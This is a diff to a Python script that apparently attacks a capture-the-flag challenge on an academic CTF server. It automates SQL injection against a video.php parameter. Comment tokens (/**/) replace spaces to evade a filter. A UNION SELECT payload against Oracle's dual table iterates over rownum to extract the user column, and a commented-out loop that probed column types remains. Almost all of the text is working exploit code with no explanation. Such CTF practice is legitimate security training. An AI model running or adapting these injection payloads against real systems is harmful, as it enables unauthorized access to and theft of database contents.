@@ -3,19 +3,37 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1'
+url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/all/**/select/**/1,user,null/**/from/**/dual/**/where/**/rownum/**/=/**/'
 
-for first in ['null', '1', '\'a\'', '\"a\"' ]:
-    for second in ['null', '1', '\'a\'', '\"a\"']:
-        for third in ['null', '1', '\'a\'', '\"a\"']:
+for row_num in range(1, 1000):
+
+    url2 = url + str(row_num)
+
+    result = requests.get(url2, verify=False)
+    if 'Error' not in result.text and 'Bad cat!' not in result.text:
+
+        splittext = result.text.splitlines()
+        for each_row in splittext:
+            if '<h2>' in each_row and len(each_row) > 13:
+                print(each_row)
+                print('url now %s'%(url2))
+
+'''
+for first in ['null', '1', '%27a%27', '%22a%22' ]:
+    for second in ['null', '1', '%27a%27', '%22a%22']:
+        for third in ['null', '1', '%27a%27', '%22a%22']:
             payload = '/**/union/**/select/**/' + first + ',' + second + ',' + third + '/**/from/**/dual'
 
             url2 = url + payload
             result = requests.get(url2, verify=False)
 
-            print('url now %s'%(url2))
-            #if 'Error' not in result.text and 'Bad cat!' not in result.text:
-                # print(result.text)
+            if 'Error' not in result.text and 'Bad cat!' not in result.text:
+                print(result.text)
+                print('url now %s'%(url2))
+            else:
+                print(result.text.splitlines()[-1])
+                print('url now %s'%(url2))
+'''
 
 '''
 for i in range(0, 100):
